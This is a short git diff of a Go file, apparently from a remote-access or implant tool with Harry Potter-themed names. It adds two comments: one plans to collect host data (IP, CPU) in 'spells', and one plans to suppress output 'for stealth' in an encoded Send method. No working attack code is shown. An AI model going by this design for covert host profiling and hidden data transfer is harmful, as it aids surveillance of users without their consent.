@@ -13,7 +13,7 @@ type FlooNetwork interface{
 
 }
 
-type Scroll	struct{
+type Scroll	struct{ // i'll have a hard work to implement a func that fetch all that data from OS in spells 
 	ID			string
 	IP			net.IP
 	CPU			struct{
@@ -51,6 +51,7 @@ type ArcaneLink struct{
 
 }
 
+// need to remove stdout for stealth in spells
 func (a *ArcaneLink) Send(data []byte) (error) {
 	encodedData, err := a.Fidelius.Encode(data)
 	if err != nil {
